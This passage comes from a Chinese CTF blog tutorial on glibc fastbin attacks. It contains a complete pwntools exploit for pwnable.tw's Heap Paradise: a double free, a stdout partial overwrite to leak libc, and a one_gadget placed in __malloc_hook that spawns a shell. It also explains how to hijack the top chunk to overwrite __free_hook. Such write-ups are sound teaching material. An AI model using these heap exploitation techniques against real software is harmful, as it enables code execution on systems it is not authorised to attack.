class="line">#<span class="number">0</span>  _IO_puts (str=<span class="number">0x24</span> &lt;error: Cannot access memory at address <span class="number">0x24</span>&gt;) at ioputs.c:<span class="number">33</span></span><br><span class="line">#<span class="number">1</span>  <span class="number">0x00007fe6f4da3d8a</span> in __strdup (s=<span class="number">0x7ffd7c35b6a0</span> <span class="string">"/lib/x86_64-linux-gnu/libgcc_s.so.1"</span>) at strdup.c:<span class="number">42</span></span><br><span class="line">#<span class="number">2</span>  <span class="number">0x00007fe6f4d9f60f</span> in _dl_load_cache_lookup (name=name@entry=<span class="number">0x7fe6f4b49aa6</span> <span class="string">"libgcc_s.so.1"</span>) at dl-cache.c:<span class="number">311</span></span><br><span class="line">#<span class="number">3</span>  <span class="number">0x00007fe6f4d8ff99</span> in _dl_map_object (loader=loader@entry=<span class="number">0x7fe6f4fab4d8</span>, name=name@entry=<span class="number">0x7fe6f4b49aa6</span> <span class="string">"libgcc_s.so.1"</span>, type=type@entry=<span class="number">0x2</span>, trace_mode=trace_mode@entry=<span class="number">0x0</span>, mode=mode@entry=<span class="number">0x90000001</span>, nsid=&lt;optimized out&gt;) at dl-load.c:<span class="number">2342</span></span><br><span class="line">#4  0x00007fe6f4d9c3a7 in dl_open_worker (a=a@entry=0x7ffd7c35bd90) at dl-open.c:237</span><br><span class="line">#<span class="number">5</span>  <span class="number">0x00007fe6f4d97394</span> in _dl_catch_error (objname=objname@entry=<span class="number">0x7ffd7c35bd80</span>, errstring=errstring@entry=<span class="number">0x7ffd7c35bd88</span>, mallocedp=mallocedp@entry=<span class="number">0x7ffd7c35bd7f</span>, operate=operate@entry=<span class="number">0x7fe6f4d9c300</span> &lt;dl_open_worker&gt;, args=args@entry=<span class="number">0x7ffd7c35bd90</span>) at dl-error.c:<span class="number">187</span></span><br><span class="line">#<span class="number">6</span>  <span class="number">0x00007fe6f4d9bbd9</span> in _dl_open (file=<span class="number">0x7fe6f4b49aa6</span> <span class="string">"libgcc_s.so.1"</span>, mode=<span class="number">0x80000001</span>, caller_dlopen=<span class="number">0x7fe6f4ad2fd1</span> &lt;__GI___backtrace+<span class="number">193</span>&gt;, nsid=<span class="number">0xfffffffffffffffe</span>, argc=&lt;optimized out&gt;, argv=&lt;optimized out&gt;, env=<span class="number">0x7ffd7c35cac8</span>) at dl-<span class="built_in">open</span>.c:<span class="number">660</span></span><br><span class="line">#7  0x00007fe6f4b009bd in do_dlopen (ptr=ptr@entry=0x7ffd7c35bfb0) at dl-libc.c:87</span><br><span class="line">#<span class="number">8</span>  <span class="number">0x00007fe6f4d97394</span> in _dl_catch_error (objname=<span class="number">0x7ffd7c35bfa0</span>, errstring=<span class="number">0x7ffd7c35bfa8</span>, mallocedp=<span class="number">0x7ffd7c35bf9f</span>, operate=<span class="number">0x7fe6f4b00980</span> &lt;do_dlopen&gt;, args=<span class="number">0x7ffd7c35bfb0</span>) at dl-error.c:<span class="number">187</span></span><br><span class="line">#9  0x00007fe6f4b00a74 in dlerror_run (args=0x7ffd7c35bfb0, operate=0x7fe6f4b00980 &lt;do_dlopen&gt;) at dl-libc.c:46</span><br><span class="line">#<span class="number">10</span> __GI___libc_dlopen_mode (name=name@entry=<span class="number">0x7fe6f4b49aa6</span> <span class="string">"libgcc_s.so.1"</span>, mode=mode@entry=<span class="number">0x80000001</span>) at dl-libc.c:<span class="number">163</span></span><br><span class="line">#11 0x00007fe6f4ad2fd1 in init () at ../sysdeps/x86_64/backtrace.c:52</span><br><span class="line">#<span class="number">12</span> __GI___backtrace (<span class="built_in">array</span>=<span class="built_in">array</span>@entry=<span class="number">0x7ffd7c35c010</span>, <span class="built_in">size</span>=<span class="built_in">size</span>@entry=<span class="number">0x40</span>) at ../sysdeps/x86_64/backtrace.c:<span class="number">105</span></span><br><span class="line">#13 0x00007fe6f49dd9f5 in backtrace_and_maps (do_abort=&lt;optimized out&gt;, do_abort@entry=0x2, written=&lt;optimized out&gt;, fd=fd@entry=0x3) at ../sysdeps/unix/sysv/linux/libc_fatal.c:47</span><br><span class="line">#<span class="number">14</span> <span class="number">0x00007fe6f4a357e5</span> in __libc_message (do_abort=do_abort@entry=<span class="number">0x2</span>, fmt=fmt@entry=<span class="number">0x7fe6f4b4e2e0</span> <span class="string">"*** Error in `%s': %s: 0x%s ***\n"</span>) at ../sysdeps/posix/libc_fatal.c:<span class="number">172</span></span><br><span class="line">#15 0x00007fe6f4a3de0a in malloc_printerr (ar_ptr=&lt;optimized out&gt;, ptr=&lt;optimized out&gt;, str=0x7fe6f4b4e3a8 "double free or corruption (fasttop)", action=0x3) at malloc.c:5004</span><br><span class="line">#<span class="number">16</span> _int_free (av=&lt;optimized out&gt;, p=&lt;optimized out&gt;, have_lock=<span class="number">0x0</span>) at <span class="built_in">malloc</span>.c:<span class="number">3865</span></span><br><span class="line">#<span class="number">17</span> <span class="number">0x00007fe6f4a4198c</span> in __GI___libc_free (mem=&lt;optimized out&gt;) at <span class="built_in">malloc</span>.c:<span class="number">2966</span></span><br><span class="line">#<span class="number">18</span> <span class="number">0x000055eca8269e79</span> in ?? ()</span><br><span class="line">#<span class="number">19</span> <span class="number">0x000000087c35cab0</span> in ?? ()</span><br><span class="line">#<span class="number">20</span> <span class="number">0x77c3b85bb5ec5800</span> in ?? ()</span><br><span class="line">#<span class="number">21</span> <span class="number">0x0000000000000000</span> in ?? ()</span><br></pre></td></tr></table></figure><p> 最后在<code>__strdup</code>里面调用了一次<code>malloc</code>触发了<code>__malloc_hook</code>：</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> *</span><br><span class="line">__strdup (<span class="keyword">const</span> <span class="keyword">char</span> *s)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">size_t</span> len = <span class="built_in">strlen</span> (s) + <span class="number">1</span>;</span><br><span class="line"><span class="keyword">void</span> *<span class="keyword">new</span> = <span class="built_in">malloc</span> (len);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">new</span> == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> (<span class="keyword">char</span> *) <span class="built_in">memcpy</span> (<span class="keyword">new</span>, s, len);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> （有点好奇，咋发现的，这也tql。。）</p></blockquote><h4 id="Heap-Paradise"><a href="#Heap-Paradise" class="headerlink" title="Heap Paradise"></a>Heap Paradise</h4><p>程序很简单，<code>delete</code>功能存在明显的free后没有清空指针的漏洞，所以毋庸置疑又是fastbin double free：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __int64 v0; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Index :"</span>);</span><br><span class="line">    v0 = choice();</span><br><span class="line">    <span class="keyword">if</span> ( v0 &lt;= <span class="number">15</span> )</span><br><span class="line">        <span class="built_in">free</span>(chunk_array[v0]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是<code>add</code>功能限制了能分配的堆块的size：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> v0; <span class="comment">// rax</span></span><br><span class="line">    <span class="keyword">int</span> i; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="built_in">size</span>; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ( i &gt; <span class="number">15</span> )</span><br><span class="line">        &#123;</span><br><span class="line">        LODWORD(v0) = <span class="built_in">puts</span>(<span class="string">"You can't allocate anymore !"</span>);</span><br><span class="line">        <span class="keyword">return</span> v0;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( !chunk_array[i] )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Size :"</span>);</span><br><span class="line">    v0 = choice();</span><br><span class="line">    <span class="built_in">size</span> = v0;</span><br><span class="line">    <span class="keyword">if</span> ( v0 &lt;= <span class="number">0x78</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        chunk_array[i] = <span class="built_in">malloc</span>(v0);</span><br><span class="line">        <span class="keyword">if</span> ( !chunk_array[i] )</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Error!"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Data :"</span>);</span><br><span class="line">        LODWORD(v0) = read_data((__int64)chunk_array[i], <span class="built_in">size</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主要思路就是:</p></li><li><p>利用fastbin double free形成chunk overlap，创造出一个unsorted bin。</p></li><li><p>注意到题目是没有<code>view</code>功能的，所以只能通过partial overwrite <code>unsorted bin-&gt;fd</code>，使其指向<code>_IO_2_1_stdout</code>结构体附近，然后通过fastbin分配该处空间来更改结构体从而完成leak libc。</p></li><li><p>libc leak完成之后，剩下的就是再次利用fastbin double free改<code>__malloc_hook</code>为onegadget。</p></li><li><p>题目的难点在于，只能分配16次chunk，要在有限的chunk里完成这么多动作，考察的就是堆布局的能力了，所以至于如何布局这里就不再赘述了。<br>此外，由于我的写法在完成上述操作之后就用完的所有的<code>add</code>机会，所以只能通过fastbin double free corruption来触发<code>__malloc_hook</code>了。<br><br>我的exp（布局肯定不止这一种，仅供参考）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line">one_gadget_offset = <span class="number">0xef6c4</span></span><br><span class="line">malloc_hook_offset = libc.symbols[<span class="string">"__malloc_hook"</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = "debug"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size, data)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"You Choice:"</span>, <span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Size :"</span>, str(size))</span><br><span class="line">    p.sendafter(<span class="string">"Data :"</span>, data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"You Choice:"</span>, <span class="string">"2"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Index :"</span>, str(index))</span><br><span class="line"></span><br><span class="line">libc_offset = <span class="number">0x3c4600</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># fastbin double free</span></span><br><span class="line">        add(<span class="number">0x68</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>)) <span class="comment"># chunk 0</span></span><br><span class="line">        add(<span class="number">0x28</span>, <span class="string">"BBBB"</span>) <span class="comment"># chunk 1</span></span><br><span class="line">        add(<span class="number">0x28</span>, <span class="string">"CCCC"</span>) <span class="comment"># chunk 2</span></span><br><span class="line">        add(<span class="number">0x68</span>, <span class="string">"D"</span> * <span class="number">0x40</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>)) <span class="comment"># chunk 3</span></span><br><span class="line">        delete(<span class="number">0</span>)</span><br><span class="line">        delete(<span class="number">3</span>)</span><br><span class="line">        delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># create unsorted bin</span></span><br><span class="line">        add(<span class="number">0x68</span>, <span class="string">"\x10"</span>) <span class="comment"># chunk 4</span></span><br><span class="line">        add(<span class="number">0x68</span>, <span class="string">"DDDD"</span>) <span class="comment"># chunk 5</span></span><br><span class="line">        add(<span class="number">0x68</span>, <span class="string">"EEEE"</span>) <span class="comment"># chunk 6</span></span><br><span class="line">        add(<span class="number">0x68</span>, <span class="string">"F"</span> * <span class="number">0x50</span> + p64(<span class="number">0</span>) + p64(<span class="number">0xb1</span>)) <span class="comment"># chunk 7</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># # free unsorted bin</span></span><br><span class="line">        delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># # malloc unsorted bin, perform partially write to stdout</span></span><br><span class="line">        delete(<span class="number">3</span>)</span><br><span class="line">        add(<span class="number">0x58</span>, <span class="string">"G"</span> * <span class="number">0x20</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x81</span>) + p64(<span class="number">0</span>)) <span class="comment"># chunk 8</span></span><br><span class="line">        delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># # brute force 4 bits</span></span><br><span class="line">        add(<span class="number">0x78</span>, <span class="string">"H"</span> * <span class="number">0x20</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>) + p16(<span class="number">0xa620</span> - <span class="number">0x43</span>)) <span class="comment"># chunk 9</span></span><br><span class="line"></span><br><span class="line">        add(<span class="number">0x68</span>, <span class="string">"IIII"</span>) <span class="comment"># chunk 10</span></span><br><span class="line">        add(<span class="number">0x68</span>, <span class="string">"J"</span> * <span class="number">0x33</span> + p64(<span class="number">0xfbad1800</span>) + p64(<span class="number">0</span>) * <span class="number">3</span> + <span class="string">"\x00"</span>) <span class="comment"># chunk 11</span></span><br><span class="line"></span><br><span class="line">        string = p.recv(<span class="number">4</span>)</span><br><span class="line">        <span class="keyword">if</span> string == <span class="string">"****"</span> <span class="keyword">or</span> string == <span class="string">"read"</span>:</span><br><span class="line">            p.close()</span><br><span class="line">            <span class="keyword">if</span> _pwn_remote == <span class="number">0</span>:</span><br><span class="line">                p = process(argv=[_proc], env=_setup_env())</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                p = remote(<span class="string">'chall.pwnable.tw'</span>, <span class="number">10308</span>)</span><br><span class="line">            <span class="keyword">if</span> _debug != <span class="number">0</span>:</span><br><span class="line">                gdb.attach(p)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            p.recv(<span class="number">0x40</span><span class="number">-4</span>)</span><br><span class="line">            libc_addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line">            libc_base = libc_addr - <span class="number">0x3c4600</span></span><br><span class="line">            malloc_hook = libc_base + malloc_hook_offset</span><br><span class="line">            one_gadget = libc_base + one_gadget_offset</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">if</span> _pwn_remote == <span class="number">0</span>:</span><br><span class="line">            p = process(argv=[_proc], env=_setup_env())</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            p = remote(<span class="string">'chall.pwnable.tw'</span>, <span class="number">10308</span>)</span><br><span class="line">        <span class="keyword">if</span> _debug != <span class="number">0</span>:</span><br><span class="line">            gdb.attach(p)</span><br><span class="line"></span><br><span class="line"><span class="comment"># write __malloc_hook</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x68</span>, p64(malloc_hook - <span class="number">0x23</span>)) <span class="comment"># chunk 12</span></span><br><span class="line">add(<span class="number">0x68</span>, <span class="string">"KKKK"</span>) <span class="comment"># chunk 13</span></span><br><span class="line">add(<span class="number">0x68</span>, <span class="string">"LLLL"</span>) <span class="comment"># chunk 14</span></span><br><span class="line">add(<span class="number">0x68</span>, <span class="string">"I"</span> * <span class="number">0x13</span> + p64(one_gadget)) <span class="comment"># chunk 15</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># double free error ==&gt; malloc_printerr ==&gt; __malloc_hook</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> _pwn_remote == <span class="number">1</span>:</span><br><span class="line">    context.log_level = <span class="string">"debug"</span></span><br><span class="line">    p.send(<span class="string">"cat /home/heap_paradise/flag\x00"</span>)</span><br><span class="line"></span><br><span class="line">success(<span class="string">"libc_addr: "</span> + hex(libc_addr))</span><br><span class="line">success(<span class="string">"libc_base: "</span> + hex(libc_base))</span><br><span class="line"><span class="comment"># success("libc_realloc: " + hex(libc_realloc))</span></span><br><span class="line">success(<span class="string">"malloc_hook: "</span> + hex(malloc_hook))</span><br><span class="line">success(<span class="string">"one_gadget: "</span> + hex(one_gadget))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li></ol><h2 id="write-free-hook-through-top-chunk"><a href="#write-free-hook-through-top-chunk" class="headerlink" title="write __free_hook through top chunk"></a>write __free_hook through top chunk</h2><p>这应该是最稳的方法之一了，因为直接调<code>system(&quot;/bin/sh&quot;)</code>一般来说没有什么限制，但是利用起来还是要花一点功夫的。</p><h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><p>我们知道fastbin的malloc需要满足size的约束，但是<code>__free_hook</code>的上方全是”\x00”，显然无法直接分配，所以需要借助其他的办法。<br><br>首先了解一下<code>main_arena</code>的结构（这是堆块信息还没有被写入的时候）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">gef➤  p main_arena</span><br><span class="line">$1 &#x3D; &#123;</span><br><span class="line">    mutex &#x3D; 0x0, </span><br><span class="line">    flags &#x3D; 0x0, </span><br><span class="line">    have_fastchunks &#x3D; 0x0, </span><br><span class="line">    fastbinsY &#x3D; &#123;0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0&#125;, </span><br><span class="line">    top &#x3D; 0x0, </span><br><span class="line">    last_remainder &#x3D; 0x0, </span><br><span class="line">    bins &#x3D; &#123;0x0 &lt;repeats 254 times&gt;&#125;, </span><br><span class="line">    binmap &#x3D; &#123;0x0, 0x0, 0x0, 0x0&#125;, </span><br><span class="line">    next &#x3D; 0x7ffff7dcfc40 &lt;main_arena&gt;, </span><br><span class="line">    next_free &#x3D; 0x0, </span><br><span class="line">    attached_threads &#x3D; 0x1, </span><br><span class="line">    system_mem &#x3D; 0x0, </span><br><span class="line">    max_system_mem &#x3D; 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可见这个的<code>top</code>储存了top chunk的位置，也就是说当我们需要从top chunk分配内存空间的时候，会从这里获取top chunk的位置信息，然后再切割分配（下图是Glibc 2.27下的情况）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">gef➤  p main_arena</span><br><span class="line">$2 &#x3D; &#123;</span><br><span class="line">    mutex &#x3D; 0x0, </span><br><span class="line">    flags &#x3D; 0x0, </span><br><span class="line">    have_fastchunks &#x3D; 0x0, </span><br><span class="line">    fastbinsY &#x3D; &#123;0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0&#125;, </span><br><span class="line">    top &#x3D; 0x555555757270, </span><br><span class="line">    last_remainder &#x3D; 0x0, </span><br><span class="line">    bins &#x3D; &#123;</span><br><span class="line">               0x7ffff7dcfca0 &lt;main_arena+96&gt;, 0x7ffff7dcfca0 &lt;main_arena+96&gt;, </span><br><span class="line">               0x7ffff7dcfcb0 &lt;main_arena+112&gt;, 0x7ffff7dcfcb0 &lt;main_arena+112&gt;,</span><br><span class="line">               ......</span><br><span class="line">               0x7ffff7dd0480 &lt;main_arena+2112&gt;, 0x7ffff7dd0480 &lt;main_arena+2112&gt;</span><br><span class="line">           &#125;</span><br><span class="line">    binmap &#x3D; &#123;0x0, 0x0, 0x0, 0x0&#125;, </span><br><span class="line">    next &#x3D; 0x7ffff7dcfc40 &lt;main_arena&gt;, </span><br><span class="line">    next_free &#x3D; 0x0, </span><br><span class="line">    attached_threads &#x3D; 0x1, </span><br><span class="line">    system_mem &#x3D; 0x21000, </span><br><span class="line">    max_system_mem &#x3D; 0x21000</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么就可以通过修改<code>main_arena</code>中的<code>top</code>为<code>__free_hook</code>的上方某个区域（该区域存在足够大的数据以充当size字段），然后通过不断地从top chunk分配内存空间直到可以写到<code>__free_hook</code>中去。<br><br>但是观察<code>main_arena</code>上方可以发现，并不能直接利用fastbin attack分配到可以写<code>top</code>的地址空间：<br><img src="/2020/04/15/Fastbin-attack-%E5%B0%8F%E7%BB%93/main_arena.png" alt><br>那么这里还需要多利用一次fastbin attack，在<code>top</code>的上方进行fastbin attack写入size来供后续的fastbin attack改写<code>top</code>。<br><br>还有一个问题，把top chunk改到哪里，经调试发现，在<code>__free_hook-0xb58</code>的位置发现一个足够大的值（随机的）可作为top chunk的size（不知道不同版本的Glibc会不会有差异，这里测试的Glibc 2.23和Gblic 2.27都符合情况）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">gef➤  p &amp;__free_hook</span><br><span class="line">$2 &#x3D; (void (**)(void *, const void *)) 0x7ffff7dd18e8 &lt;__free_hook&gt;</span><br><span class="line">gef➤  tele 0x7ffff7dd18e8-0xb58</span><br><span class="line">0x00007ffff7dd0d90│+0x0000: 0x0000000000000004</span><br><span class="line">0x00007ffff7dd0d98│+0x0008: 0x9aa83c6e1b4e13d1</span><br><span class="line">0x00007ffff7dd0da0│+0x0010: 0x0000000000000000</span><br><span class="line">0x00007ffff7dd0da8│+0x0018: 0x0000000000000000</span><br><span class="line">0x00007ffff7dd0db0│+0x0020: 0x0000000000000000</span><br><span class="line">0x00007ffff7dd0db8│+0x0028: 0x0000000000000000</span><br><span class="line">0x00007ffff7dd0dc0│+0x0030: 0x0000000000000000</span><br><span class="line">0x00007ffff7dd0dc8│+0x0038: 0x0000000000000000</span><br><span class="line">0x00007ffff7dd0dd0│+0x0040: 0x0000000000000000</span><br><span class="line">0x00007ffff7dd0dd8│+0x0048: 0x0000000000000000</span><br></pre></td></tr></table></figure><p>这样就可以劫持top chunk，然后不断地malloc，直到往<code>__free_hook</code>写入<code>system</code>的地址，最后<code>free</code>一个写有”/bin/sh”的堆块就可以geshell了。</p><h3 id="举例-2"><a href="#举例-2" class="headerlink" title="举例"></a>举例</h3><h4 id="CISCN-2019-华东北赛区-Pwn-pwn4"><a href="#CISCN-2019-华东北赛区-Pwn-pwn4" class="headerlink" title="CISCN-2019-华东北赛区-Pwn-pwn4"></a>CISCN-2019-华东北赛区-Pwn-pwn4</h4><p><code>edit</code>功能的<code>getsize</code>提供了一个字节溢出，可以off by one造成chunk overlap从而造成uaf：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">__<span class="function">int64 <span class="title">edit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">    <span class="keyword">signed</span> <span class="keyword">int</span> v2; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">    <span class="keyword">signed</span> <span class="keyword">int</span> v3; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">    <span class="keyword">int</span> v4; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"index: "</span>);</span><br><span class="line">    v2 = choice(v1);</span><br><span class="line">    v3 = v2;</span><br><span class="line">    <span class="keyword">if</span> ( v2 &gt;= <span class="number">0</span> &amp;&amp; v2 &lt;= <span class="number">15</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        v2 = *((_DWORD *)&amp;chunk_status + <span class="number">4</span> * v2);</span><br><span class="line">        <span class="keyword">if</span> ( v2 == <span 